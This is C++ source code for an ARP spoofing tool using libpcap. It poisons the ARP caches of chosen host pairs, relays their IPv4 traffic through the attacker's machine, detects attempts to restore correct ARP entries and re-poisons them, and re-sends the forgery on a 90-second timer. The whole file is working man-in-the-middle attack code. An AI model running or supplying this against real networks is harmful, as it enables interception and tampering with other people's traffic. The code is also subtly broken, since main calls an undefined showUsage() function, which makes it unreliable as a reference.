#include <cstdio>
#include <pcap.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <cstdint>
#include <cstring>
#include <unistd.h>
#include <vector>
#include <thread>
#include <chrono>
#include <iostream>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct ArpPacket {
    EthHdr eth;
    ArpHdr arp;
};
#pragma pack(pop)

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: arp-tool wlan0 192.168.0.2 192.168.0.1\n");
}

int fetchLocalMac(const char* iface, uint8_t* mac) {
    struct ifreq ifr {};
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) != 0) {
        close(sock);
        return -1;
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return 0;
}

void transmitArp(pcap_t* pcap, const uint8_t* srcMac, const uint8_t* dstMac,
                 const char* srcIp, const char* dstIp, bool reply) {
    ArpPacket pkt;

    pkt.eth.dmac_ = Mac(dstMac);
    pkt.eth.smac_ = Mac(srcMac);
    pkt.eth.type_ = htons(EthHdr::Arp);

    pkt.arp.hrd_ = htons(ArpHdr::ETHER);
    pkt.arp.pro_ = htons(EthHdr::Ip4);
    pkt.arp.hln_ = Mac::Size;
    pkt.arp.pln_ = Ip::Size;
    pkt.arp.op_ = htons(reply ? ArpHdr::Reply : ArpHdr::Request);
    pkt.arp.smac_ = Mac(srcMac);
    pkt.arp.sip_ = htonl(Ip(srcIp));
    pkt.arp.tmac_ = Mac(dstMac);
    pkt.arp.tip_ = htonl(Ip(dstIp));

    if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pkt), sizeof(pkt)) != 0) {
        std::cerr << "[!] Failed to send ARP: " << pcap_geterr(pcap) << "\n";
    }
}

Mac resolveMac(pcap_t* pcap, const uint8_t* localMac, const char* ip) {
    uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    char dummyIp[] = "0.0.0.0";

    transmitArp(pcap, localMac, bcast, dummyIp, ip, false);

    struct pcap_pkthdr* hdr;
    const u_char* data;
    ArpPacket res;

    while (true) {
        if (pcap_next_ex(pcap, &hdr, &data) <= 0) continue;

        memcpy(&res, data, sizeof(res));
        if (ntohs(res.eth.type_) != EthHdr::Arp) continue;
        if (ntohs(res.arp.op_) != ArpHdr::Reply) continue;
        if (res.arp.sip() != Ip(ip)) continue;

        return res.arp.smac();
    }
}

struct ArpSpoofSession {
    uint8_t localMac[6];
    uint8_t peer1Mac[6];
    uint8_t peer2Mac[6];
    const char* peer1Ip;
    const char* peer2Ip;
    pcap_t* handle;
};

void spoofAndRelay(ArpSpoofSession session) {
    using namespace std::chrono;

    auto last = steady_clock::now();
    transmitArp(session.handle, session.localMac, session.peer1Mac, session.peer2Ip, session.peer1Ip, true);
    transmitArp(session.handle, session.localMac, session.peer2Mac, session.peer1Ip, session.peer2Ip, true);

    std::cout << "[*] Started session: " << session.peer1Ip << " <-> " << session.peer2Ip << "\n";

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;

        if (pcap_next_ex(session.handle, &header, &packet) <= 0) continue;

        EthHdr* eth = (EthHdr*)packet;
        uint16_t type = ntohs(eth->type_);

        if (type == EthHdr::Arp) {
            ArpPacket* arp = (ArpPacket*)packet;
            auto op = ntohs(arp->arp.op_);

            if (op == ArpHdr::Request) {
                bool isRelated = (arp->arp.sip() == Ip(session.peer1Ip) && arp->arp.tip() == Ip(session.peer2Ip)) ||
                                 (arp->arp.sip() == Ip(session.peer2Ip) && arp->arp.tip() == Ip(session.peer1Ip));
                if (isRelated) {
                    std::cout << "[!] Recovery attempt detected (ARP request)\n";
                    transmitArp(session.handle, session.localMac, session.peer1Mac, session.peer2Ip, session.peer1Ip, true);
                    transmitArp(session.handle, session.localMac, session.peer2Mac, session.peer1Ip, session.peer2Ip, true);
                    last = steady_clock::now();
                }
            } else if (op == ArpHdr::Reply) {
                bool from1 = (arp->arp.sip() == Ip(session.peer1Ip) && arp->arp.smac() == Mac(session.peer1Mac));
                bool from2 = (arp->arp.sip() == Ip(session.peer2Ip) && arp->arp.smac() == Mac(session.peer2Mac));
                if (from1 || from2) {
                    std::cout << "[!] Recovery attempt detected (ARP reply)\n";
                    transmitArp(session.handle, session.localMac, session.peer1Mac, session.peer2Ip, session.peer1Ip, true);
                    transmitArp(session.handle, session.localMac, session.peer2Mac, session.peer1Ip, session.peer2Ip, true);
                    last = steady_clock::now();
                }
            }
        } else if (type == EthHdr::Ip4) {
            if (eth->smac() == session.peer1Mac && eth->dmac() == session.localMac) {
                std::vector<u_char> relay(packet, packet + header->caplen);
                auto eth2 = (EthHdr*)relay.data();
                eth2->smac_ = Mac(session.localMac);
                eth2->dmac_ = Mac(session.peer2Mac);
                pcap_sendpacket(session.handle, relay.data(), header->caplen);
            } else if (eth->smac() == session.peer2Mac && eth->dmac() == session.localMac) {
                std::vector<u_char> relay(packet, packet + header->caplen);
                auto eth2 = (EthHdr*)relay.data();
                eth2->smac_ = Mac(session.localMac);
                eth2->dmac_ = Mac(session.peer1Mac);
                pcap_sendpacket(session.handle, relay.data(), header->caplen);
            }
        }

        if (duration_cast<seconds>(steady_clock::now() - last).count() >= 90) {
            std::cout << "[*] Timer triggered ARP reinfection.\n";
            transmitArp(session.handle, session.localMac, session.peer1Mac, session.peer2Ip, session.peer1Ip, true);
            transmitArp(session.handle, session.localMac, session.peer2Mac, session.peer1Ip, session.peer2Ip, true);
            last = steady_clock::now();
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        showUsage();
        return 1;
    }

    const char* iface = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    uint8_t myMac[6];

    if (fetchLocalMac(iface, myMac) != 0) {
        std::cerr << "[X] Failed to get MAC address for " << iface << "\n";
        return 1;
    }

    std::vector<std::thread> workers;
    for (int i = 2; i < argc; i += 2) {
        const char* ip1 = argv[i];
        const char* ip2 = argv[i + 1];

        pcap_t* pcap = pcap_open_live(iface, 65536, 1, 1, errbuf);
        if (!pcap) {
            std::cerr << "[X] pcap_open_live error: " << errbuf << "\n";
            continue;
        }

        ArpSpoofSession session {};
        memcpy(session.localMac, myMac, 6);
        session.peer1Ip = ip1;
        session.peer2Ip = ip2;
        session.handle = pcap;

        Mac mac1 = resolveMac(pcap, myMac, ip1);
        Mac mac2 = resolveMac(pcap, myMac, ip2);
        memcpy(session.peer1Mac, static_cast<const uint8_t*>(mac1), 6);
        memcpy(session.peer2Mac, static_cast<const uint8_t*>(mac2), 6);

        std::cout << "[*] Session setup: " << ip1 << " <-> " << ip2 << "\n";
        workers.emplace_back(spoofAndRelay, session);
    }

    for (auto& t : workers) t.join();
    return 0;
}
